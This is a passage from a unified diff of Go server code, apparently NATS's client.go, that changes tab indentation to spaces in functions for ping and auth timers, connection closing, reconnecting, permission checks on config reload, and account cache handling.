c.enqueueProto([]byte(fmt.Sprintf(errProto, \"Stale Connection\")))\n+                        c.mu.Unlock()\n+                        c.closeConnection(StaleConnection)\n+                        return\n+                }\n+                // Send PING\n+                c.sendPing()\n+        }\n+\n+        // Reset to fire again.\n+        c.setPingTimer()\n+        c.mu.Unlock()\n }\n \n // Returns the smallest value between the given `d` and `gatewayMaxPingInterval` durations.\n // Invoked for connections known to be of GATEWAY type.\n func adjustPingIntervalForGateway(d time.Duration) time.Duration {\n-\tif d > gatewayMaxPingInterval {\n-\t\treturn gatewayMaxPingInterval\n-\t}\n-\treturn d\n+        if d > gatewayMaxPingInterval {\n+                return gatewayMaxPingInterval\n+        }\n+        return d\n }\n \n // Lock should be held\n func (c *client) setPingTimer() {\n-\tif c.srv == nil {\n-\t\treturn\n-\t}\n-\td := c.srv.getOpts().PingInterval\n-\tif c.kind == GATEWAY {\n-\t\td = adjustPingIntervalForGateway(d)\n-\t}\n-\tc.ping.tmr = time.AfterFunc(d, c.processPingTimer)\n+        if c.srv == nil {\n+                return\n+        }\n+        d := c.srv.getOpts().PingInterval\n+        if c.kind == GATEWAY {\n+                d = adjustPingIntervalForGateway(d)\n+        }\n+        c.ping.tmr = time.AfterFunc(d, c.processPingTimer)\n }\n \n // Lock should be held\n func (c *client) clearPingTimer() {\n-\tif c.ping.tmr == nil {\n-\t\treturn\n-\t}\n-\tc.ping.tmr.Stop()\n-\tc.ping.tmr = nil\n+        if c.ping.tmr == nil {\n+                return\n+        }\n+        c.ping.tmr.Stop()\n+        c.ping.tmr = nil\n }\n \n func (c *client) clearTlsToTimer() {\n-\tif c.tlsTo == nil {\n-\t\treturn\n-\t}\n-\tc.tlsTo.Stop()\n-\tc.tlsTo = nil\n+        if c.tlsTo == nil {\n+                return\n+        }\n+        c.tlsTo.Stop()\n+        c.tlsTo = nil\n }\n \n // Lock should be held\n func (c *client) setAuthTimer(d time.Duration) {\n-\tc.atmr = time.AfterFunc(d, c.authTimeout)\n+        c.atmr = time.AfterFunc(d, c.authTimeout)\n }\n \n // Lock should be held\n func (c *client) clearAuthTimer() bool {\n-\tif c.atmr == nil {\n-\t\treturn true\n-\t}\n-\tstopped := c.atmr.Stop()\n-\tc.atmr = nil\n-\treturn stopped\n+        if c.atmr == nil {\n+                return true\n+        }\n+        stopped := c.atmr.Stop()\n+        c.atmr = nil\n+        return stopped\n }\n \n // We may reuse atmr for expiring user jwts,\n // so check connectReceived.\n // Lock assume held on entry.\n func (c *client) awaitingAuth() bool {\n-\treturn !c.flags.isSet(connectReceived) && c.atmr != nil\n+        return !c.flags.isSet(connectReceived) && c.atmr != nil\n }\n \n // This will set the atmr for the JWT expiration time.\n // We will lock on entry.\n func (c *client) setExpirationTimer(d time.Duration) {\n-\tc.mu.Lock()\n-\tc.atmr = time.AfterFunc(d, c.authExpired)\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        c.atmr = time.AfterFunc(d, c.authExpired)\n+        c.mu.Unlock()\n }\n \n // Possibly flush the connection and then close the low level connection.\n@@ -4556,360 +4558,360 @@ func (c *client) setExpirationTimer(d time.Duration) {\n // minimal write deadline.\n // Lock is held on entry.\n func (c *client) flushAndClose(minimalFlush bool) {\n-\tif !c.flags.isSet(skipFlushOnClose) && c.out.pb > 0 {\n-\t\tif minimalFlush {\n-\t\t\tconst lowWriteDeadline = 100 * time.Millisecond\n-\n-\t\t\t// Reduce the write deadline if needed.\n-\t\t\tif c.out.wdl > lowWriteDeadline {\n-\t\t\t\tc.out.wdl = lowWriteDeadline\n-\t\t\t}\n-\t\t}\n-\t\tc.flushOutbound()\n-\t}\n-\tc.out.p, c.out.s = nil, nil\n-\n-\t// Close the low level connection.\n-\tif c.nc != nil {\n-\t\t// Starting with Go 1.16, the low level close will set its own deadline\n-\t\t// of 5 seconds, so setting our own deadline does not work. Instead,\n-\t\t// we will close the TLS connection in separate go routine.\n-\t\tnc := c.nc\n-\t\tc.nc = nil\n-\t\tif _, ok := nc.(*tls.Conn); ok {\n-\t\t\tgo func() { nc.Close() }()\n-\t\t} else {\n-\t\t\tnc.Close()\n-\t\t}\n-\t}\n+        if !c.flags.isSet(skipFlushOnClose) && c.out.pb > 0 {\n+                if minimalFlush {\n+                        const lowWriteDeadline = 100 * time.Millisecond\n+\n+                        // Reduce the write deadline if needed.\n+                        if c.out.wdl > lowWriteDeadline {\n+                                c.out.wdl = lowWriteDeadline\n+                        }\n+                }\n+                c.flushOutbound()\n+        }\n+        c.out.p, c.out.s = nil, nil\n+\n+        // Close the low level connection.\n+        if c.nc != nil {\n+                // Starting with Go 1.16, the low level close will set its own deadline\n+                // of 5 seconds, so setting our own deadline does not work. Instead,\n+                // we will close the TLS connection in separate go routine.\n+                nc := c.nc\n+                c.nc = nil\n+                if _, ok := nc.(*tls.Conn); ok {\n+                        go func() { nc.Close() }()\n+                } else {\n+                        nc.Close()\n+                }\n+        }\n }\n \n var kindStringMap = map[int]string{\n-\tCLIENT:    \"Client\",\n-\tROUTER:    \"Router\",\n-\tGATEWAY:   \"Gateway\",\n-\tLEAF:      \"Leafnode\",\n-\tJETSTREAM: \"JetStream\",\n-\tACCOUNT:   \"Account\",\n-\tSYSTEM:    \"System\",\n+        CLIENT:    \"Client\",\n+        ROUTER:    \"Router\",\n+        GATEWAY:   \"Gateway\",\n+        LEAF:      \"Leafnode\",\n+        JETSTREAM: \"JetStream\",\n+        ACCOUNT:   \"Account\",\n+        SYSTEM:    \"System\",\n }\n \n func (c *client) kindString() string {\n-\tif kindStringVal, ok := kindStringMap[c.kind]; ok {\n-\t\treturn kindStringVal\n-\t}\n-\treturn \"Unknown Type\"\n+        if kindStringVal, ok := kindStringMap[c.kind]; ok {\n+                return kindStringVal\n+        }\n+        return \"Unknown Type\"\n }\n \n // swapAccountAfterReload will check to make sure the bound account for this client\n // is current. Under certain circumstances after a reload we could be pointing to\n // an older one.\n func (c *client) swapAccountAfterReload() {\n-\tc.mu.Lock()\n-\tdefer c.mu.Unlock()\n-\tif c.srv == nil {\n-\t\treturn\n-\t}\n-\tacc, _ := c.srv.LookupAccount(c.acc.Name)\n-\tc.acc = acc\n+        c.mu.Lock()\n+        defer c.mu.Unlock()\n+        if c.srv == nil {\n+                return\n+        }\n+        acc, _ := c.srv.LookupAccount(c.acc.Name)\n+        c.acc = acc\n }\n \n // processSubsOnConfigReload removes any subscriptions the client has that are no\n // longer authorized, and checks for imports (accounts) due to a config reload.\n func (c *client) processSubsOnConfigReload(awcsti map[string]struct{}) {\n-\tc.mu.Lock()\n-\tvar (\n-\t\tcheckPerms = c.perms != nil\n-\t\tcheckAcc   = c.acc != nil\n-\t\tacc        = c.acc\n-\t)\n-\tif !checkPerms && !checkAcc {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\tvar (\n-\t\t_subs    [32]*subscription\n-\t\tsubs     = _subs[:0]\n-\t\t_removed [32]*subscription\n-\t\tremoved  = _removed[:0]\n-\t\tsrv      = c.srv\n-\t)\n-\tif checkAcc {\n-\t\t// We actually only want to check if stream imports have changed.\n-\t\tif _, ok := awcsti[acc.Name]; !ok {\n-\t\t\tcheckAcc = false\n-\t\t}\n-\t}\n-\t// We will clear any mperms we have here. It will rebuild on the fly with canSubscribe,\n-\t// so we do that here as we collect them. We will check result down below.\n-\tc.mperms = nil\n-\t// Collect client's subs under the lock\n-\tfor _, sub := range c.subs {\n-\t\t// Just checking to rebuild mperms under the lock, will collect removed though here.\n-\t\t// Only collect under subs array of canSubscribe and checkAcc true.\n-\t\tcanSub := c.canSubscribe(string(sub.subject))\n-\t\tcanQSub := sub.queue != nil && c.canQueueSubscribe(string(sub.subject), string(sub.queue))\n-\n-\t\tif !canSub && !canQSub {\n-\t\t\tremoved = append(removed, sub)\n-\t\t} else if checkAcc {\n-\t\t\tsubs = append(subs, sub)\n-\t\t}\n-\t}\n-\tc.mu.Unlock()\n-\n-\t// This list is all subs who are allowed and we need to check accounts.\n-\tfor _, sub := range subs {\n-\t\tc.mu.Lock()\n-\t\toldShadows := sub.shadow\n-\t\tsub.shadow = nil\n-\t\tc.mu.Unlock()\n-\t\tc.addShadowSubscriptions(acc, sub)\n-\t\tfor _, nsub := range oldShadows {\n-\t\t\tnsub.im.acc.sl.Remove(nsub)\n-\t\t}\n-\t}\n-\n-\t// Unsubscribe all that need to be removed and report back to client and logs.\n-\tfor _, sub := range removed {\n-\t\tc.unsubscribe(acc, sub, true, true)\n-\t\tc.sendErr(fmt.Sprintf(\"Permissions Violation for Subscription to %q (sid %q)\",\n-\t\t\tsub.subject, sub.sid))\n-\t\tsrv.Noticef(\"Removed sub %q (sid %q) for %s - not authorized\",\n-\t\t\tsub.subject, sub.sid, c.getAuthUser())\n-\t}\n+        c.mu.Lock()\n+        var (\n+                checkPerms = c.perms != nil\n+                checkAcc   = c.acc != nil\n+                acc        = c.acc\n+        )\n+        if !checkPerms && !checkAcc {\n+                c.mu.Unlock()\n+                return\n+        }\n+        var (\n+                _subs    [32]*subscription\n+                subs     = _subs[:0]\n+                _removed [32]*subscription\n+                removed  = _removed[:0]\n+                srv      = c.srv\n+        )\n+        if checkAcc {\n+                // We actually only want to check if stream imports have changed.\n+                if _, ok := awcsti[acc.Name]; !ok {\n+                        checkAcc = false\n+                }\n+        }\n+        // We will clear any mperms we have here. It will rebuild on the fly with canSubscribe,\n+        // so we do that here as we collect them. We will check result down below.\n+        c.mperms = nil\n+        // Collect client's subs under the lock\n+        for _, sub := range c.subs {\n+                // Just checking to rebuild mperms under the lock, will collect removed though here.\n+                // Only collect under subs array of canSubscribe and checkAcc true.\n+                canSub := c.canSubscribe(string(sub.subject))\n+                canQSub := sub.queue != nil && c.canQueueSubscribe(string(sub.subject), string(sub.queue))\n+\n+                if !canSub && !canQSub {\n+                        removed = append(removed, sub)\n+                } else if checkAcc {\n+                        subs = append(subs, sub)\n+                }\n+        }\n+        c.mu.Unlock()\n+\n+        // This list is all subs who are allowed and we need to check accounts.\n+        for _, sub := range subs {\n+                c.mu.Lock()\n+                oldShadows := sub.shadow\n+                sub.shadow = nil\n+                c.mu.Unlock()\n+                c.addShadowSubscriptions(acc, sub)\n+                for _, nsub := range oldShadows {\n+                        nsub.im.acc.sl.Remove(nsub)\n+                }\n+        }\n+\n+        // Unsubscribe all that need to be removed and report back to client and logs.\n+        for _, sub := range removed {\n+                c.unsubscribe(acc, sub, true, true)\n+                c.sendErr(fmt.Sprintf(\"Permissions Violation for Subscription to %q (sid %q)\",\n+                        sub.subject, sub.sid))\n+                srv.Noticef(\"Removed sub %q (sid %q) for %s - not authorized\",\n+                        sub.subject, sub.sid, c.getAuthUser())\n+        }\n }\n \n // Allows us to count up all the queue subscribers during close.\n type qsub struct {\n-\tsub *subscription\n-\tn   int32\n+        sub *subscription\n+        n   int32\n }\n \n func (c *client) closeConnection(reason ClosedState) {\n-\tc.mu.Lock()\n-\tif c.flags.isSet(closeConnection) {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\t// Note that we may have markConnAsClosed() invoked before closeConnection(),\n-\t// so don't set this to 1, instead bump the count.\n-\tc.rref++\n-\tc.flags.set(closeConnection)\n-\tc.clearAuthTimer()\n-\tc.clearPingTimer()\n-\tc.clearTlsToTimer()\n-\tc.markConnAsClosed(reason)\n-\n-\t// Unblock anyone who is potentially stalled waiting on us.\n-\tif c.out.stc != nil {\n-\t\tclose(c.out.stc)\n-\t\tc.out.stc = nil\n-\t}\n-\n-\tvar (\n-\t\tconnectURLs   []string\n-\t\twsConnectURLs []string\n-\t\tkind          = c.kind\n-\t\tsrv           = c.srv\n-\t\tnoReconnect   = c.flags.isSet(noReconnect)\n-\t\tacc           = c.acc\n-\t\tspoke         bool\n-\t)\n-\n-\t// Snapshot for use if we are a client connection.\n-\t// FIXME(dlc) - we can just stub in a new one for client\n-\t// and reference existing one.\n-\tvar subs []*subscription\n-\tif kind == CLIENT || kind == LEAF || kind == JETSTREAM {\n-\t\tvar _subs [32]*subscription\n-\t\tsubs = _subs[:0]\n-\t\tfor _, sub := range c.subs {\n-\t\t\t// Auto-unsubscribe subscriptions must be unsubscribed forcibly.\n-\t\t\tsub.max = 0\n-\t\t\tsub.close()\n-\t\t\tsubs = append(subs, sub)\n-\t\t}\n-\t\tspoke = c.isSpokeLeafNode()\n-\t}\n-\n-\tif c.route != nil {\n-\t\tconnectURLs = c.route.connectURLs\n-\t\twsConnectURLs = c.route.wsConnURLs\n-\t}\n-\n-\t// If we have remote latency tracking running shut that down.\n-\tif c.rrTracking != nil {\n-\t\tc.rrTracking.ptmr.Stop()\n-\t\tc.rrTracking = nil\n-\t}\n-\n-\tc.mu.Unlock()\n-\n-\t// Remove client's or leaf node or jetstream subscriptions.\n-\tif acc != nil && (kind == CLIENT || kind == LEAF || kind == JETSTREAM) {\n-\t\tacc.sl.RemoveBatch(subs)\n-\t} else if kind == ROUTER {\n-\t\tgo c.removeRemoteSubs()\n-\t}\n-\n-\tif srv != nil {\n-\t\t// If this is a route that disconnected, possibly send an INFO with\n-\t\t// the updated list of connect URLs to clients that know how to\n-\t\t// handle async INFOs.\n-\t\tif (len(connectURLs) > 0 || len(wsConnectURLs) > 0) && !srv.getOpts().Cluster.NoAdvertise {\n-\t\t\tsrv.removeConnectURLsAndSendINFOToClients(connectURLs, wsConnectURLs)\n-\t\t}\n-\n-\t\t// Unregister\n-\t\tsrv.removeClient(c)\n-\n-\t\t// Update remote subscriptions.\n-\t\tif acc != nil && (kind == CLIENT || kind == LEAF || kind == JETSTREAM) {\n-\t\t\tqsubs := map[string]*qsub{}\n-\t\t\tfor _, sub := range subs {\n-\t\t\t\t// Call unsubscribe here to cleanup shadow subscriptions and such.\n-\t\t\t\tc.unsubscribe(acc, sub, true, false)\n-\t\t\t\t// Update route as normal for a normal subscriber.\n-\t\t\t\tif sub.queue == nil {\n-\t\t\t\t\tif !spoke {\n-\t\t\t\t\t\tsrv.updateRouteSubscriptionMap(acc, sub, -1)\n-\t\t\t\t\t\tif srv.gateway.enabled {\n-\t\t\t\t\t\t\tsrv.gatewayUpdateSubInterest(acc.Name, sub, -1)\n-\t\t\t\t\t\t}\n-\t\t\t\t\t}\n-\t\t\t\t\tsrv.updateLeafNodes(acc, sub, -1)\n-\t\t\t\t} else {\n-\t\t\t\t\t// We handle queue subscribers special in case we\n-\t\t\t\t\t// have a bunch we can just send one update to the\n-\t\t\t\t\t// connected routes.\n-\t\t\t\t\tnum := int32(1)\n-\t\t\t\t\tif kind == LEAF {\n-\t\t\t\t\t\tnum = sub.qw\n-\t\t\t\t\t}\n-\t\t\t\t\tkey := string(sub.subject) + \" \" + string(sub.queue)\n-\t\t\t\t\tif esub, ok := qsubs[key]; ok {\n-\t\t\t\t\t\tesub.n += num\n-\t\t\t\t\t} else {\n-\t\t\t\t\t\tqsubs[key] = &qsub{sub, num}\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\t// Process any qsubs here.\n-\t\t\tfor _, esub := range qsubs {\n-\t\t\t\tif !spoke {\n-\t\t\t\t\tsrv.updateRouteSubscriptionMap(acc, esub.sub, -(esub.n))\n-\t\t\t\t\tif srv.gateway.enabled {\n-\t\t\t\t\t\tsrv.gatewayUpdateSubInterest(acc.Name, esub.sub, -(esub.n))\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tsrv.updateLeafNodes(acc, esub.sub, -(esub.n))\n-\t\t\t}\n-\t\t\tif prev := acc.removeClient(c); prev == 1 {\n-\t\t\t\tsrv.decActiveAccounts()\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Don't reconnect connections that have been marked with\n-\t// the no reconnect flag.\n-\tif noReconnect {\n-\t\treturn\n-\t}\n-\n-\tc.reconnect()\n+        c.mu.Lock()\n+        if c.flags.isSet(closeConnection) {\n+                c.mu.Unlock()\n+                return\n+        }\n+        // Note that we may have markConnAsClosed() invoked before closeConnection(),\n+        // so don't set this to 1, instead bump the count.\n+        c.rref++\n+        c.flags.set(closeConnection)\n+        c.clearAuthTimer()\n+        c.clearPingTimer()\n+        c.clearTlsToTimer()\n+        c.markConnAsClosed(reason)\n+\n+        // Unblock anyone who is potentially stalled waiting on us.\n+        if c.out.stc != nil {\n+                close(c.out.stc)\n+                c.out.stc = nil\n+        }\n+\n+        var (\n+                connectURLs   []string\n+                wsConnectURLs []string\n+                kind          = c.kind\n+                srv           = c.srv\n+                noReconnect   = c.flags.isSet(noReconnect)\n+                acc           = c.acc\n+                spoke         bool\n+        )\n+\n+        // Snapshot for use if we are a client connection.\n+        // FIXME(dlc) - we can just stub in a new one for client\n+        // and reference existing one.\n+        var subs []*subscription\n+        if kind == CLIENT || kind == LEAF || kind == JETSTREAM {\n+                var _subs [32]*subscription\n+                subs = _subs[:0]\n+                for _, sub := range c.subs {\n+                        // Auto-unsubscribe subscriptions must be unsubscribed forcibly.\n+                        sub.max = 0\n+                        sub.close()\n+                        subs = append(subs, sub)\n+                }\n+                spoke = c.isSpokeLeafNode()\n+        }\n+\n+        if c.route != nil {\n+                connectURLs = c.route.connectURLs\n+                wsConnectURLs = c.route.wsConnURLs\n+        }\n+\n+        // If we have remote latency tracking running shut that down.\n+        if c.rrTracking != nil {\n+                c.rrTracking.ptmr.Stop()\n+                c.rrTracking = nil\n+        }\n+\n+        c.mu.Unlock()\n+\n+        // Remove client's or leaf node or jetstream subscriptions.\n+        if acc != nil && (kind == CLIENT || kind == LEAF || kind == JETSTREAM) {\n+                acc.sl.RemoveBatch(subs)\n+        } else if kind == ROUTER {\n+                go c.removeRemoteSubs()\n+        }\n+\n+        if srv != nil {\n+                // If this is a route that disconnected, possibly send an INFO with\n+                // the updated list of connect URLs to clients that know how to\n+                // handle async INFOs.\n+                if (len(connectURLs) > 0 || len(wsConnectURLs) > 0) && !srv.getOpts().Cluster.NoAdvertise {\n+                        srv.removeConnectURLsAndSendINFOToClients(connectURLs, wsConnectURLs)\n+                }\n+\n+                // Unregister\n+                srv.removeClient(c)\n+\n+                // Update remote subscriptions.\n+                if acc != nil && (kind == CLIENT || kind == LEAF || kind == JETSTREAM) {\n+                        qsubs := map[string]*qsub{}\n+                        for _, sub := range subs {\n+                                // Call unsubscribe here to cleanup shadow subscriptions and such.\n+                                c.unsubscribe(acc, sub, true, false)\n+                                // Update route as normal for a normal subscriber.\n+                                if sub.queue == nil {\n+                                        if !spoke {\n+                                                srv.updateRouteSubscriptionMap(acc, sub, -1)\n+                                                if srv.gateway.enabled {\n+                                                        srv.gatewayUpdateSubInterest(acc.Name, sub, -1)\n+                                                }\n+                                        }\n+                                        srv.updateLeafNodes(acc, sub, -1)\n+                                } else {\n+                                        // We handle queue subscribers special in case we\n+                                        // have a bunch we can just send one update to the\n+                                        // connected routes.\n+                                        num := int32(1)\n+                                        if kind == LEAF {\n+                                                num = sub.qw\n+                                        }\n+                                        key := string(sub.subject) + \" \" + string(sub.queue)\n+                                        if esub, ok := qsubs[key]; ok {\n+                                                esub.n += num\n+                                        } else {\n+                                                qsubs[key] = &qsub{sub, num}\n+                                        }\n+                                }\n+                        }\n+                        // Process any qsubs here.\n+                        for _, esub := range qsubs {\n+                                if !spoke {\n+                                        srv.updateRouteSubscriptionMap(acc, esub.sub, -(esub.n))\n+                                        if srv.gateway.enabled {\n+                                                srv.gatewayUpdateSubInterest(acc.Name, esub.sub, -(esub.n))\n+                                        }\n+                                }\n+                                srv.updateLeafNodes(acc, esub.sub, -(esub.n))\n+                        }\n+                        if prev := acc.removeClient(c); prev == 1 {\n+                                srv.decActiveAccounts()\n+                        }\n+                }\n+        }\n+\n+        // Don't reconnect connections that have been marked with\n+        // the no reconnect flag.\n+        if noReconnect {\n+                return\n+        }\n+\n+        c.reconnect()\n }\n \n // Depending on the kind of connections, this may attempt to recreate a connection.\n // The actual reconnect attempt will be started in a go routine.\n func (c *client) reconnect() {\n-\tvar (\n-\t\tretryImplicit bool\n-\t\tgwName        string\n-\t\tgwIsOutbound  bool\n-\t\tgwCfg         *gatewayCfg\n-\t)\n-\n-\tc.mu.Lock()\n-\t// Decrease the ref count and perform the reconnect only if == 0.\n-\tc.rref--\n-\tif c.flags.isSet(noReconnect) || c.rref > 0 {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\tif c.route != nil {\n-\t\tretryImplicit = c.route.retry\n-\t}\n-\tkind := c.kind\n-\tif kind == GATEWAY {\n-\t\tgwName = c.gw.name\n-\t\tgwIsOutbound = c.gw.outbound\n-\t\tgwCfg = c.gw.cfg\n-\t}\n-\tsrv := c.srv\n-\tc.mu.Unlock()\n-\n-\t// Check for a solicited route. If it was, start up a reconnect unless\n-\t// we are already connected to the other end.\n-\tif c.isSolicitedRoute() || retryImplicit {\n-\t\t// Capture these under lock\n-\t\tc.mu.Lock()\n-\t\trid := c.route.remoteID\n-\t\trtype := c.route.routeType\n-\t\trurl := c.route.url\n-\t\tc.mu.Unlock()\n-\n-\t\tsrv.mu.Lock()\n-\t\tdefer srv.mu.Unlock()\n-\n-\t\t// It is possible that the server is being shutdown.\n-\t\t// If so, don't try to reconnect\n-\t\tif !srv.running {\n-\t\t\treturn\n-\t\t}\n-\n-\t\tif rid != \"\" && srv.remotes[rid] != nil {\n-\t\t\tsrv.Debugf(\"Not attempting reconnect for solicited route, already connected to \\\"%s\\\"\", rid)\n-\t\t\treturn\n-\t\t} else if rid == srv.info.ID {\n-\t\t\tsrv.Debugf(\"Detected route to self, ignoring %q\", rurl.Redacted())\n-\t\t\treturn\n-\t\t} else if rtype != Implicit || retryImplicit {\n-\t\t\tsrv.Debugf(\"Attempting reconnect for solicited route \\\"%s\\\"\", rurl.Redacted())\n-\t\t\t// Keep track of this go-routine so we can wait for it on\n-\t\t\t// server shutdown.\n-\t\t\tsrv.startGoRoutine(func() { srv.reConnectToRoute(rurl, rtype) })\n-\t\t}\n-\t} else if srv != nil && kind == GATEWAY && gwIsOutbound {\n-\t\tif gwCfg != nil {\n-\t\t\tsrv.Debugf(\"Attempting reconnect for gateway %q\", gwName)\n-\t\t\t// Run this as a go routine since we may be called within\n-\t\t\t// the solicitGateway itself if there was an error during\n-\t\t\t// the creation of the gateway connection.\n-\t\t\tsrv.startGoRoutine(func() { srv.reconnectGateway(gwCfg) })\n-\t\t} else {\n-\t\t\tsrv.Debugf(\"Gateway %q not in configuration, not attempting reconnect\", gwName)\n-\t\t}\n-\t} else if c.isSolicitedLeafNode() {\n-\t\t// Check if this is a solicited leaf node. Start up a reconnect.\n-\t\tsrv.startGoRoutine(func() { srv.reConnectToRemoteLeafNode(c.leaf.remote) })\n-\t}\n+        var (\n+                retryImplicit bool\n+                gwName        string\n+                gwIsOutbound  bool\n+                gwCfg         *gatewayCfg\n+        )\n+\n+        c.mu.Lock()\n+        // Decrease the ref count and perform the reconnect only if == 0.\n+        c.rref--\n+        if c.flags.isSet(noReconnect) || c.rref > 0 {\n+                c.mu.Unlock()\n+                return\n+        }\n+        if c.route != nil {\n+                retryImplicit = c.route.retry\n+        }\n+        kind := c.kind\n+        if kind == GATEWAY {\n+                gwName = c.gw.name\n+                gwIsOutbound = c.gw.outbound\n+                gwCfg = c.gw.cfg\n+        }\n+        srv := c.srv\n+        c.mu.Unlock()\n+\n+        // Check for a solicited route. If it was, start up a reconnect unless\n+        // we are already connected to the other end.\n+        if c.isSolicitedRoute() || retryImplicit {\n+                // Capture these under lock\n+                c.mu.Lock()\n+                rid := c.route.remoteID\n+                rtype := c.route.routeType\n+                rurl := c.route.url\n+                c.mu.Unlock()\n+\n+                srv.mu.Lock()\n+                defer srv.mu.Unlock()\n+\n+                // It is possible that the server is being shutdown.\n+                // If so, don't try to reconnect\n+                if !srv.running {\n+                        return\n+                }\n+\n+                if rid != \"\" && srv.remotes[rid] != nil {\n+                        srv.Debugf(\"Not attempting reconnect for solicited route, already connected to \\\"%s\\\"\", rid)\n+                        return\n+                } else if rid == srv.info.ID {\n+                        srv.Debugf(\"Detected route to self, ignoring %q\", rurl.Redacted())\n+                        return\n+                } else if rtype != Implicit || retryImplicit {\n+                        srv.Debugf(\"Attempting reconnect for solicited route \\\"%s\\\"\", rurl.Redacted())\n+                        // Keep track of this go-routine so we can wait for it on\n+                        // server shutdown.\n+                        srv.startGoRoutine(func() { srv.reConnectToRoute(rurl, rtype) })\n+                }\n+        } else if srv != nil && kind == GATEWAY && gwIsOutbound {\n+                if gwCfg != nil {\n+                        srv.Debugf(\"Attempting reconnect for gateway %q\", gwName)\n+                        // Run this as a go routine since we may be called within\n+                        // the solicitGateway itself if there was an error during\n+                        // the creation of the gateway connection.\n+                        srv.startGoRoutine(func() { srv.reconnectGateway(gwCfg) })\n+                } else {\n+                        srv.Debugf(\"Gateway %q not in configuration, not attempting reconnect\", gwName)\n+                }\n+        } else if c.isSolicitedLeafNode() {\n+                // Check if this is a solicited leaf node. Start up a reconnect.\n+                srv.startGoRoutine(func() { srv.reConnectToRemoteLeafNode(c.leaf.remote) })\n+        }\n }\n \n // Set the noReconnect flag. This is used before a call to closeConnection()\n // to prevent the connection to reconnect (routes, gateways).\n func (c *client) setNoReconnect() {\n-\tc.mu.Lock()\n-\tc.flags.set(noReconnect)\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        c.flags.set(noReconnect)\n+        c.mu.Unlock()\n }\n \n // Returns the client's RTT value with the protection of the client's lock.\n func (c *client) getRTTValue() time.Duration {\n-\tc.mu.Lock()\n-\trtt := c.rtt\n-\tc.mu.Unlock()\n-\treturn rtt\n+        c.mu.Lock()\n+        rtt := c.rtt\n+        c.mu.Unlock()\n+        return rtt\n }\n \n // This function is used by ROUTER and GATEWAY connections to\n@@ -4919,180 +4921,180 @@ func (c *client) getRTTValue() time.Duration {\n // is returned, otherwse, we match the account's sublist and update\n // the cache. The cache is pruned if reaching a certain size.\n func (c *client) getAccAndResultFromCache() (*Account, *SublistResult) {\n-\tvar (\n-\t\tacc *Account\n-\t\tpac *perAccountCache\n-\t\tr   *SublistResult\n-\t\tok  bool\n-\t)\n-\t// Check our cache.\n-\tif pac, ok = c.in.pacache[string(c.pa.pacache)]; ok {\n-\t\t// Check the genid to see if it's still valid.\n-\t\t// sl could be swapped out on reload so need to lock.\n-\t\tpac.acc.mu.RLock()\n-\t\tsl := pac.acc.sl\n-\t\tpac.acc.mu.RUnlock()\n-\n-\t\tif genid := atomic.LoadUint64(&sl.genid); genid != pac.genid {\n-\t\t\tok = false\n-\t\t\tdelete(c.in.pacache, string(c.pa.pacache))\n-\t\t} else {\n-\t\t\tacc = pac.acc\n-\t\t\tr = pac.results\n-\t\t}\n-\t}\n-\n-\tif !ok {\n-\t\t// Match correct account and sublist.\n-\t\tif acc, _ = c.srv.LookupAccount(string(c.pa.account)); acc == nil {\n-\t\t\treturn nil, nil\n-\t\t}\n-\n-\t\t// sl could be swapped out on reload so need to lock.\n-\t\tacc.mu.RLock()\n-\t\tsl := acc.sl\n-\t\tacc.mu.RUnlock()\n-\n-\t\t// Match against the account sublist.\n-\t\tr = sl.Match(string(c.pa.subject))\n-\n-\t\t// Store in our cache\n-\t\tc.in.pacache[string(c.pa.pacache)] = &perAccountCache{acc, r, atomic.LoadUint64(&sl.genid)}\n-\n-\t\t// Check if we need to prune.\n-\t\tif len(c.in.pacache) > maxPerAccountCacheSize {\n-\t\t\tc.prunePerAccountCache()\n-\t\t}\n-\t}\n-\treturn acc, r\n+        var (\n+                acc *Account\n+                pac *perAccountCache\n+                r   *SublistResult\n+                ok  bool\n+        )\n+        // Check our cache.\n+        if pac, ok = c.in.pacache[string(c.pa.pacache)]; ok {\n+                // Check the genid to see if it's still valid.\n+                // sl could be swapped out on reload so need to lock.\n+                pac.acc.mu.RLock()\n+                sl := pac.acc.sl\n+                pac.acc.mu.RUnlock()\n+\n+                if genid := atomic.LoadUint64(&sl.genid); genid != pac.genid {\n+                        ok = false\n+                        delete(c.in.pacache, string(c.pa.pacache))\n+                } else {\n+                        acc = pac.acc\n+                        r = pac.results\n+                }\n+        }\n+\n+        if !ok {\n+                // Match correct account and sublist.\n+                if acc, _ = c.srv.LookupAccount(string(c.pa.account)); acc == nil {\n+                        return nil, nil\n+                }\n+\n+                // sl could be swapped out on reload so need to lock.\n+                acc.mu.RLock()\n+                sl := acc.sl\n+                acc.mu.RUnlock()\n+\n+                // Match against the account sublist.\n+                r = sl.Match(string(c.pa.subject))\n+\n+                // Store in our cache\n+                c.in.pacache[string(c.pa.pacache)] = &perAccountCache{acc, r, atomic.LoadUint64(&sl.genid)}\n+\n+                // Check if we need to prune.\n+                if len(c.in.pacache) > maxPerAccountCacheSize {\n+                        c.prunePerAccountCache()\n+                }\n+        }\n+        return acc, r\n }\n \n // Account will return the associated account for this client.\n func (c *client) Account() *Account {\n-\tif c == nil {\n-\t\treturn nil\n-\t}\n-\tc.mu.Lock()\n-\tacc := c.acc\n-\tc.mu.Unlock()\n-\treturn acc\n+        if c == nil {\n+                return nil\n+        }\n+        c.mu.Lock()\n+        acc := c.acc\n+        c.mu.Unlock()\n+        return acc\n }\n \n // prunePerAccountCache will prune off a random number of cache entries.\n func (c *client) prunePerAccountCache() {\n-\tn := 0\n-\tfor cacheKey := range c.in.pacache {\n-\t\tdelete(c.in.pacache, cacheKey)\n-\t\tif n++; n > prunePerAccountCacheSize {\n-\t\t\tbreak\n-\t\t}\n-\t}\n+        n := 0\n+        for cacheKey := range c.in.pacache {\n+                delete(c.in.pacache, cacheKey)\n+                if n++; n > prunePerAccountCacheSize {\n+                        break\n+                }\n+        }\n }\n \n // pruneClosedSubFromPerAccountCache remove entries that contain subscriptions\n // that have been closed.\n func (c *client) pruneClosedSubFromPerAccountCache() {\n-\tfor cacheKey, pac := range c.in.pacache {\n-\t\tfor _, sub := range pac.results.psubs 